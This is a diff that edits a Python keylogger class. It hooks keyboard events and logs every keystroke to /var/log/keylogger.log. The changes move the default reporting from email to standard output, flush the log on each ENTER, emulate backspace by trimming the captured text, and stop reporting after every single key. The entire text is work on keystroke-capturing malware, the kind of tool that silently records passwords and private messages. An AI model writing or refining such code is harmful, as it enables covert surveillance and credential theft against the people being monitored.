@@ -2,7 +2,7 @@ import keyboard
 from datetime import datetime
 
 class Keylogger:
-    def __init__(self, report_method="email"):
+    def __init__(self, report_method="stdout"):
         self.report_method = report_method
         self.log = ""
         self.filename = "/var/log/keylogger.log"
@@ -24,10 +24,16 @@ class Keylogger:
             elif name == "enter":
                 # add a new line whenever an ENTER is pressed
                 name = "\n"
+                self.log += name
+                self.report()
+                name = ""
             elif name == "decimal":
                 name = "."
             elif name == "backspace":
-                name = "\b"
+                name = ""
+                if len(self.log) > 0:
+                    # emulate backspace
+                    self.log = self.log[:-1]
             else:
                 if name in ["ctrl", "alt", "shift", "alt gr"]:
                     name = ""
@@ -36,8 +42,8 @@ class Keylogger:
                     # name = f"[{name.upper()}]"
                     name = ""
         self.log += name
-        # start reporting the keylogs
-        self.report()
+        # # start reporting the keylogs
+        # self.report()
 
     def report_to_file(self):
         """This method creates a log file in the current directory that contains
